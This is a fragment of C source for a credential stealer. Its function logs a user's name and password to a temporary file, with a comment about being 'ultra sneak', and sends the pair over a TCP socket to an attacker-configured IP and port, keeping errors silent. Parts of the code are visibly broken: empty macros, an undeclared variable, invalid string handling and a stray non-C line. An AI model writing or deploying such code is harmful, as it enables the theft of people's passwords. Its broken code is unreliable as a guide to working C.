#include <sys/socket.h> 
#include <arpa/inet.h> 
#include <unistd.h> 
#include <string.h> 
#define PORT 
#define IP 


# Function
int writetofile (char *password){

    // Get UID
    uid_t uid = geteuid();
    struct passwd * pw = getpwuid(uid);
        
    // Create File + Variables
    FILE * fptr;
    fptr = fopen("/tmp/18432443.tmp", "a"); // Remove for ultra sneak
    char * user;
    char * msg;
    char * msg2;
    char * colon;

    // Write Shit
    if (pw) {
        user = pw->pw_name;
    }
    else {
        user = "unknown";
    }

    if (fptr != NULL) {

        fprintf(fptr, "%s:%s\n", name, password);
            
        // // Send stuff // //
        // Make Socket
        int sock = 0, valread;
        struct sockaddr_in serv_addr;
            
        // Build String
        strcpy(user, name);
        msg = ("%s", password);
        msg2 = ("%s:", user);
        colon = ':';
        strncat(msg2, &colon, 1);
        strcat(msg2, msg);

        char buffer[1024] = {0};
        fclose(fptr);

        // Error Handling
        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
            // printf("\n Socket creation error \n");
            return -1;
        }

        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(PORT);
            
        struct timeval timeout;
        timeout.tv_sec = 3;
        timeout.tv_usec = 0;

        if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)  {
            // puts("Setsockopt failed\n");
            return -1;
        }
            
        if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout) < 0) {
            // puts("setsockopt failed\n");
        }


        // Error Handling
        if(inet_pton(AF_INET, IP, &serv_addr.sin_addr)<=0) {
            // puts("\nInvalid address/ Address not supported \n");
            return -1;
        }
        if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            return -1;
        }

        // Send Message
        send(sock , msg2 , strlen(msg2) , 0 );
        return 0;
    }

    return 0;
}